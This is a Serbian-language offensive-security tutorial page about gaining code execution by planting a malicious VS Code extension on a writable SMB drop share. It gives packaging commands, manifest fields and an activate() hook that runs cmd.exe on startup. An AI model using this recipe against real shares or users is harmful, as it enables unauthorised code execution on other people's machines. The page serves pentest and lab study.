# Izvršavanje putem drop-share-a VS Code ekstenzije

{{#include ../banners/hacktricks-training.md}}

VS Code ekstenzije i Visual Studio VSSDK ekstenzije koriste `.vsix` pakovanje, ali imaju različite manifeste i runtime okruženja. SMB drop share sa dozvolom za upis postaje putanja za izvršavanje **samo ako** drugi korisnik ili posao za deployment instalira njegove pakete u VS Code. Tada se funkcija `activate()` ekstenzije izvršava u hostu ekstenzija sa privilegijama tog korisnika. Samo upisivanje `.vsix` datoteke na share ne izvršava je.<sup>[[1]](#references)[[2]](#references)</sup>

## Tok pakovanja i aktivacije

Najpre potvrdite verziju VS Code-a koja koristi ekstenziju i da li je share zaista sinhronizovan ili instaliran. Generišite TypeScript ekstenziju i smestite željenu Node.js akciju u `activate()`. Koristite događaj aktivacije koji se pokreće bez komande koju izabere korisnik, kao što je `onStartupFinished`, a zatim kompajlirajte i zapakujte ekstenziju. `engines.vscode` je **uslov za kompatibilnost sa runtime okruženjem**; usklađivanje `@types/vscode` са циљном верзијом API-ја представља меру компатибилности током изградње, а не захтев приликом инсталације.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

Za editor koji koristi VS Code 1.118, relevantna polja u datoteci `package.json` su:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

Minimalna provera `activate()` može da izvrši komandu i zabeleži njen izlaz iz hosta ekstenzije. Zamenite testnu akciju tek nakon što potvrdite da je paket aktiviran u očekivanom nalogu/sesiji. Događaj `onStartupFinished` pokreće se nakon pokretanja, pa nije dokaz izvršavanja dok se editor zaista ne pokrene i dok ekstenzija ne bude instalirana i omogućena.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

Napadač sa write pristupom drop share-u može da otpremi testirani paket i sačeka da ga job koji ga koristi preuzme. U primeru sa Checkpoint-om, pristup share-u sa obnovljenog naloga omogućio je taj write; početni nalog sa niskim privilegijama mogao je samo da čita sadržaj share-a. Razlikujte ta dva preduslova. Za ekstenzije za **Visual Studio** koristite zasebno poglavlje [Visual Studio VSIX extension abuse](visual-studio-vsix-extension-abuse.md), a ne ovaj VS Code tok rada.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - Događaji aktivacije](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Objavljivanje ekstenzija](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
